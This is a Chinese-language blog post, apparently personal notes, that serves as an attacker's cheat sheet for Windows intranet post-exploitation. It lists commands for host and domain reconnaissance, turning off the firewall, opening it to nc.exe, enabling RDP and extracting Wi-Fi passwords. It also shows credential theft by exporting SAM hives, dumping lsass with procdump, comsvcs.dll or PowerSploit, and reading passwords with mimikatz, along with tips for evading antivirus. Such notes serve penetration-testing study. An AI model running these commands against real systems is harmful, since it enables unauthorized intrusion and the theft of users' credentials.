<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"搜索帖子","hits_empty":"我们没有找到任何搜索结果: ${query}","hits_stats":"在 ${time} 毫秒内找到 ${hits} 结果"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="总之一堆乱七八糟的东西">
<meta property="og:type" content="article">
<meta property="og:title" content="test">
<meta property="og:url" content="http://example.com/2025/01/03/test/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="总之一堆乱七八糟的东西">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.imgur.com/hKYm43g.png">
<meta property="og:image" content="https://i.imgur.com/DI9YStV.png">
<meta property="og:image" content="https://i.imgur.com/yuG4KbE.png">
<meta property="og:image" content="https://i.imgur.com/dS847Ty.gif">
<meta property="og:image" content="https://i.imgur.com/nuqXfpn.png">
<meta property="og:image" content="https://i.imgur.com/HRWPYPn.png">
<meta property="og:image" content="https://i.imgur.com/4NMr876.png">
<meta property="og:image" content="https://i.imgur.com/8A2TJoz.png">
<meta property="og:image" content="https://i.imgur.com/B9FtUiz.png">
<meta property="og:image" content="https://i.imgur.com/wL2qzTd.png">
<meta property="og:image" content="https://i.imgur.com/GUdSRnQ.png">
<meta property="og:image" content="https://i.imgur.com/MmmDM5l.png">
<meta property="og:image" content="https://i.imgur.com/fYAAgEm.png">
<meta property="og:image" content="https://i.imgur.com/arYznKP.png">
<meta property="og:image" content="https://i.imgur.com/Z8zrS0T.png">
<meta property="og:image" content="https://i.imgur.com/HgdZwSf.png">
<meta property="og:image" content="https://i.imgur.com/2QQpneO.png">
<meta property="og:image" content="https://i.imgur.com/zsjJUbn.png">
<meta property="og:image" content="https://i.imgur.com/UqlwhNV.png">
<meta property="og:image" content="https://i.imgur.com/5paDsXN.png">
<meta property="og:image" content="https://i.imgur.com/OQfSBtx.png">
<meta property="og:image" content="https://i.imgur.com/DLeJLvQ.png">
<meta property="og:image" content="https://i.imgur.com/0VXCL0g.png">
<meta property="og:image" content="https://i.imgur.com/I8Ankov.png">
<meta property="og:image" content="https://i.imgur.com/OOtsn6J.png">
<meta property="og:image" content="https://i.imgur.com/vMBRWdY.png">
<meta property="og:image" content="https://i.imgur.com/fxAD4BT.png">
<meta property="og:image" content="https://i.imgur.com/8A4xmVl.png">
<meta property="og:image" content="https://i.imgur.com/skX6GcZ.png">
<meta property="og:image" content="https://i.imgur.com/ujDA0HP.png">
<meta property="og:image" content="https://i.imgur.com/ezYAnTB.png">
<meta property="og:image" content="https://i.imgur.com/Sgg8BQc.png">
<meta property="og:image" content="https://i.imgur.com/WtqXDYl.png">
<meta property="og:image" content="https://i.imgur.com/iPZ1EbK.png">
<meta property="og:image" content="https://i.imgur.com/lqcOQaW.png">
<meta property="og:image" content="https://i.imgur.com/P43vKKI.png">
<meta property="og:image" content="https://i.imgur.com/r2iH9O2.png">
<meta property="og:image" content="https://i.imgur.com/TqAaVQw.png">
<meta property="og:image" content="https://i.imgur.com/agv2eNC.png">
<meta property="og:image" content="https://i.imgur.com/G8MAg7N.png">
<meta property="og:image" content="https://i.imgur.com/jSsAnzD.png">
<meta property="og:image" content="https://i.imgur.com/ii27JG8.png">
<meta property="og:image" content="https://i.imgur.com/zh6Qw9P.png">
<meta property="og:image" content="https://i.imgur.com/ProY53j.png">
<meta property="og:image" content="https://i.imgur.com/wYhe535.png">
<meta property="og:image" content="https://i.imgur.com/cVffkuw.png">
<meta property="og:image" content="https://i.imgur.com/aOjJgmH.png">
<meta property="og:image" content="https://i.imgur.com/YlQjErK.png">
<meta property="og:image" content="https://i.imgur.com/rDJoOt6.png">
<meta property="og:image" content="https://i.imgur.com/peoiNeH.png">
<meta property="og:image" content="https://i.imgur.com/BJS0Huk.png">
<meta property="og:image" content="https://i.imgur.com/hynbYKc.png">
<meta property="og:image" content="https://i.imgur.com/KDXQ6IY.png">
<meta property="og:image" content="https://i.imgur.com/GSsXqbW.png">
<meta property="og:image" content="https://i.imgur.com/x3wNcTf.png">
<meta property="og:image" content="https://i.imgur.com/kRxn3tc.png">
<meta property="og:image" content="https://i.imgur.com/DF1HGcu.png">
<meta property="og:image" content="https://i.imgur.com/7IHwreX.png">
<meta property="og:image" content="https://i.imgur.com/AsePSeD.png">
<meta property="og:image" content="https://i.imgur.com/5ZFg60n.png">
<meta property="og:image" content="https://i.imgur.com/pqFpKy4.png">
<meta property="og:image" content="https://i.imgur.com/cGHlcGa.png">
<meta property="og:image" content="https://i.imgur.com/qPbxbvK.png">
<meta property="og:image" content="https://i.imgur.com/jq4MfPd.png">
<meta property="og:image" content="https://i.imgur.com/0qwDQVc.png">
<meta property="og:image" content="https://i.imgur.com/cMPZJKm.png">
<meta property="og:image" content="https://i.imgur.com/XsAxPu2.png">
<meta property="og:image" content="https://i.imgur.com/z0MrGwR.png">
<meta property="og:image" content="https://i.imgur.com/qleMPyM.png">
<meta property="og:image" content="https://i.imgur.com/uWBi7n3.png">
<meta property="og:image" content="https://i.imgur.com/yDXynMu.png">
<meta property="og:image" content="https://i.imgur.com/yIFnec2.png">
<meta property="og:image" content="https://i.imgur.com/mzvyOwG.png">
<meta property="og:image" content="https://i.imgur.com/wGOZOli.png">
<meta property="og:image" content="https://i.imgur.com/OwgaSmk.png">
<meta property="og:image" content="https://i.imgur.com/SjVV8TI.png">
<meta property="og:image" content="https://i.imgur.com/M3M1B57.png">
<meta property="og:image" content="https://i.imgur.com/zAyljql.png">
<meta property="og:image" content="https://i.imgur.com/IVOUGmC.png">
<meta property="og:image" content="https://i.imgur.com/4F98t7g.png">
<meta property="og:image" content="https://i.imgur.com/hucCXGT.png">
<meta property="og:image" content="https://i.imgur.com/nb8mHnk.png">
<meta property="og:image" content="https://i.imgur.com/stu6e54.png">
<meta property="og:image" content="https://i.imgur.com/mww7HKX.png">
<meta property="og:image" content="https://i.imgur.com/1Q7k4Ob.png">
<meta property="og:image" content="https://i.imgur.com/S5vE3dr.png">
<meta property="og:image" content="https://i.imgur.com/xbHE2An.png">
<meta property="og:image" content="https://i.imgur.com/r64yjaJ.png">
<meta property="og:image" content="https://i.imgur.com/1RexTCM.png">
<meta property="og:image" content="https://i.imgur.com/I5n52So.png">
<meta property="og:image" content="https://i.imgur.com/FzPPVJJ.gif">
<meta property="og:image" content="https://i.imgur.com/9RvGyWF.png">
<meta property="og:image" content="https://i.imgur.com/lqVR7B4.png">
<meta property="og:image" content="https://i.imgur.com/1XiNNAP.png">
<meta property="article:published_time" content="2025-01-02T16:00:00.000Z">
<meta property="article:modified_time" content="2025-01-04T07:25:33.722Z">
<meta property="article:author" content="kec的博客">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/hKYm43g.png">

<link rel="canonical" href="http://example.com/2025/01/03/test/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>test | Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/03/test/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="kec的博客">
      <meta itemprop="description" content="一句话的长度">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          test
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-01-03 00:00:00" itemprop="dateCreated datePublished" datetime="2025-01-03T00:00:00+08:00">2025-01-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-01-04 15:25:33" itemprop="dateModified" datetime="2025-01-04T15:25:33+08:00">2025-01-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>总之一堆乱七八糟的东西</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<span id="more"></span>

<h2 id="本地信息收集及基础操作"><a href="#本地信息收集及基础操作" class="headerlink" title="本地信息收集及基础操作"></a>本地信息收集及基础操作</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">ipconfig:收集本机 ip 信息，特别注意有双网卡的情况。</span><br><span class="line"></span><br><span class="line">systeminfo:收集主机名、操作系统版本，补丁信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PROCESSOR_ARCHITECTURE&quot;</span>:查看系统架构</span><br><span class="line"></span><br><span class="line">wmic product get name,version </span><br><span class="line">poweshell <span class="string">&quot;GET-WmiObject -class win32_product|Select-Object-Property name,version&quot;</span>:查看安装的软件及版本</span><br><span class="line"></span><br><span class="line">wmic service list brief:查看电脑运行的服务</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> list brief </span><br><span class="line">tasklist /svc:查看电脑运行的进程（注意各类杀软、EDR 等安全软件 是否有数据库、代理、网络监控 zabix 等）</span><br><span class="line"></span><br><span class="line">wmic startup get command,caption:查看电脑启动项</span><br><span class="line"></span><br><span class="line">schtasks /query /fo LIST /v:查看计划任务，如果出现无法加载列资源的错误 输入:chcp <span class="number">437</span></span><br><span class="line"></span><br><span class="line">net statistics workstation:查看电脑开机时间</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line">net user:查看本地用户</span><br><span class="line"></span><br><span class="line">net session:查看会话情况</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-ano</span>:查询电脑端口开放信息和连接情况（可能会找到内网其他服务器 如数据</span><br><span class="line"></span><br><span class="line">库服务器）</span><br><span class="line"></span><br><span class="line">wmic /node:localhost /namespace:\\root\securitycenter2 path antiviruspr</span><br><span class="line">oduct get displayname /format:list:查询杀软</span><br><span class="line"></span><br><span class="line">wmic share get name,path,status</span><br><span class="line">net share:查看共享信息</span><br><span class="line"></span><br><span class="line">route print:查看路由信息</span><br><span class="line"></span><br><span class="line">netsh firewall show state:查看防火墙信息</span><br><span class="line"></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable:关闭防火墙</span><br><span class="line"></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off:关闭防火墙（WS2003 之后才能使</span><br><span class="line"></span><br><span class="line">用该命令）</span><br><span class="line"></span><br><span class="line">cmdkey /l :查看 RDP 等凭据信息，如果存在可以破解拿到明文密码</span><br><span class="line"></span><br><span class="line">arp <span class="literal">-a</span> :查看 arp 信息 可能会泄露内网网段和 ip 地址等信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> %APPDATA%\Microsoft\Windows\Recent :查看最近打开的文件</span><br><span class="line"></span><br><span class="line">net localgroup :查看本地工作组</span><br><span class="line"></span><br><span class="line">net localgroup administrators ：查看组成员信息</span><br><span class="line"></span><br><span class="line">C:\Users\kzh\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine :powershell 历史命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>防火墙放行特定程序或端口，直接关闭防火墙动静太大</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2003</span> 及之前的版本，允许指定的程序进行全部的连接</span><br><span class="line"></span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe <span class="string">&quot;allownc&quot;</span> enable</span><br><span class="line"></span><br><span class="line"><span class="number">2003</span> 之后的版本，允许指定的程序进行全部的连接</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span><span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line">允许指定程序退出，命令如下netsh advfirewall firewall add rule name=<span class="string">&quot;Allownc&quot;</span><span class="built_in">dir</span>=out action=allowprogram=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line">允许 <span class="number">3389</span> 端口放行，命令如下</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;RemoteDesktop&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开启远程 3389</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber 查看 RDP 端口(<span class="number">0</span>xd3d 为 <span class="number">3389</span>)</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f 开启</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">11111111</span> /f 关闭</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\* :查看 RDP 凭据（可破解明文账号密码）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>wifi 相关:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看连接过的 wifi 名称</span><br><span class="line">netsh wlan show profiles</span><br><span class="line"></span><br><span class="line">获取 wifi 名称为 xxx 的密码</span><br><span class="line">netsh wlan show profile name=<span class="string">&quot;xxx&quot;</span> key=<span class="built_in">clear</span></span><br><span class="line"></span><br><span class="line">查看所有 wifi 及密码</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>)<span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr <span class="literal">-i</span> <span class="literal">-v</span> <span class="built_in">echo</span> |netsh wlan show profiles %j key=<span class="built_in">clear</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">wmic useraccount</span><br></pre></td></tr></table></figure>
<p>whoami 可能出现的几种情况:</p>
<ul>
<li>本地用户:机器名</li>
<li>本地超管:机器名</li>
<li>域用户:域名域超管:域名<br>如果内网中存在域，只有本地超管(包括 system)和域内用户可以查询域内信息</li>
</ul>
<p>判断域是否存在<br>ipconfig &#x2F;all<br>systeminfo<br>net config workstation<br>net time &#x2F;domain</p>
<p>查询域内组&#x2F;组成员<br>net group &#x2F;domain<br>net gtoup “Domain Admins” &#x2F;domain</p>
<p>查询域内存活计算机<br>net view &#x2F;domain:域名</p>
<p>查询域内密码测策略<br>net accounts &#x2F;domai</p>
<p>定位域控(👍)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:域名</span><br><span class="line"></span><br><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line">nslookup 域名</span><br><span class="line"></span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain:查看域控组中的机器</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> %LOGONSERVER%.%USERDNSDOMAIN%</span><br></pre></td></tr></table></figure>


<p>获取域内用户命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">net group &quot;组名&quot; /domain</span><br></pre></td></tr></table></figure>

<p>定位域管理员</p>
<p>原因：方便后续横向移动假设当前控制了一台域内主机，但是该主机上域管用户压根没有登录过。所以我们如果能找到域管理员在哪台电脑上登录过，该电脑就是首要攻击目标，结合密码抓取技术，可以轻易获取域管凭据。</p>
<p>PsLoggedon</p>
<p>该工具可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定了用户名而不是计算机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前是否已登录。</p>
<p>微软自带工具，杀软友好</p>
<p>首次使用需要输入 <code>psloggedon.exe -accepteula</code> 同意用户协议</p>
<p><code>psloggedon.exe \\computername or \\username</code></p>
<p>PVEFindADUser</p>
<p>pveFindADUser.exe 可用于查找 AD 用户登录的位置，枚举域用户，以及查找在特</p>
<p>定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和</p>
<p>计划任务的用户账户。</p>
<p>pveFindADUser.exe -current 查看机器中当前登录的用户</p>
<p>-current “用户名” 显示该特定用户登录的计算机</p>
<p>-last 查看每台机器最后登录的用户</p>
<p>-last “用户名” 显示该特定用户最后登录的计算机</p>
<h2 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h2><p>转储读取的意思就是，将 SAM 文件转储到我们自己的电脑上然后使用工具读取<br>在一定程度上可以躲避杀软</p>
<p>导出 SAM 文件：<br><img src="https://i.imgur.com/hKYm43g.png"><br>reg 命令：</p>
<ul>
<li>reg save hklm\sam sam.hive</li>
<li>reg save hklm\system system.hive (解开 sam 文件的密钥也需要导出)<br>后续system.hive以相同方式执行</li>
</ul>
<p><img src="https://i.imgur.com/DI9YStV.png"><br>cs操作下载，然后下之后到cs的服务器端查看，这里是虚拟机环境，将其中的文件拿出来重名为sam.hive和sys.hive(这里注意不要弄混了)</p>
<p>本地解密操作<br><img src="https://i.imgur.com/yuG4KbE.png" alt="xx|450x250"><br>移动到本机mimikatz目录执行命令解密</p>
<ul>
<li>lsadump::sam &#x2F;sam:sam.hive &#x2F;system:sys.hive</li>
</ul>
<p>转储读取的意思就是，将 SAM 文件转储到我们自己的电脑上然后使用工具读取，在一定程度上可以躲避杀软</p>
<h3 id="读取-lsass-进程内存密码"><a href="#读取-lsass-进程内存密码" class="headerlink" title="读取 lsass 进程内存密码"></a>读取 lsass 进程内存密码</h3><p>使用工具直接读取 lsass 进程中的明文密码，工具可能被杀。privilege:debug</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:msv 获取 HASH(LM,NTLM)</span><br><span class="line"></span><br><span class="line">sekurlsa:wdigest 通过可逆的方式去内存中读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:Kerberos 获取域管理员的明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa::tspkg 通过 tspkg 读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:livessp 通过 livessp 读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:ssp 通过 ssp 读取明文密码</span><br><span class="line"></span><br><span class="line">sekurlsa:logonPasswords 通过以上各种方法读取明文密码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/dS847Ty.gif"></p>
<h3 id="转储"><a href="#转储" class="headerlink" title="转储"></a>转储</h3><p>将 Isass 内存导出，在本地读取 Isass 内存中的明文账号密码。</p>
<p>转储内存方式有很多：</p>
<p>1、使用任务管理器直接转储</p>
<p>前提是能远程打开任务管理器，随后找到 lsass 进程右键转储即可。</p>
<p>2、procdump</p>
<p>使用 procdump 导出 Isass.dmp 文件，杀软比较友好。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/nuqXfpn.png"></p>
<p>使用mimikatz从转储的lsass.dmp中来读取明文密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span></span><br></pre></td></tr></table></figure>

<p>![[..&#x2F;附件管理&#x2F;动画26 1.gif]]</p>
<p>3、Out-MiniDump.ps1<br>项目地址-<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia&#x2F;PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework</a></p>
<p>这里仅使用其中一个 ps 脚本，用法如下:</p>
<ul>
<li>powershell-import Out-MiniDump.ps1</li>
<li>powershell Get-Process lsass | Out-MiniDump<br><img src="https://i.imgur.com/HRWPYPn.png"></li>
</ul>
<p>4、comsvcs.dll</p>
<p>Windows 自带的动态链接库，可通过其函数 MiniDump 实现 dump 内存</p>
<p>使用方法：</p>
<p>查看进程 pid:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr lsass.exe</span><br></pre></td></tr></table></figure>

<p>使用 powershell 导出:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 C:\Windows\system32\comsvcs.dll,MiniDump 488 C:\lsass.dmp full</span><br></pre></td></tr></table></figure>

<p>读取明文密码依旧使用 mimikatz：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::minidump 文件名&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE] 注意<br>某些 AV 可能会将使用 procdump.exe 转储 lsass.exe 的行为检测为恶意行为，这是因为它们检测到了字符串“procdump.exe”和“lsass.exe”。因此，将 lsass.exe 的 PID 作为参数传递给 procdump 比将名称 lsass.exe 作为参数传递更为隐蔽</p>
</blockquote>
<h3 id="高版本密码抓取"><a href="#高版本密码抓取" class="headerlink" title="高版本密码抓取"></a>高版本密码抓取</h3><p>Win7 和 Win2008 这样的机器中会存储明文密码至内存中，但是在 WS2012 之后的(win8&#x2F;10&#x2F;11,WS2012&#x2F;2016)或者安装了补丁 KB2971997 补丁的机器中内存中不再存储明文密码，无法通过上述手段抓取明文密码。</p>
<p><img src="https://i.imgur.com/4NMr876.png"></p>
<h3 id="修改-Wdigest-注册表"><a href="#修改-Wdigest-注册表" class="headerlink" title="修改 Wdigest 注册表"></a>修改 Wdigest 注册表</h3><p>在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。可以&#x3D;&#x3D;通过修改注册表的方式抓取明文&#x3D;&#x3D;，需要&#x3D;&#x3D;用户重新登录后才能成功抓取&#x3D;&#x3D;。</p>
<p>查询是否存在该值，默认情况下不存在 UseLogonCredential 值</p>
<p><img src="https://i.imgur.com/8A2TJoz.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; /V UseLogonCredential</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/B9FtUiz.png" alt="x|900x250"></p>
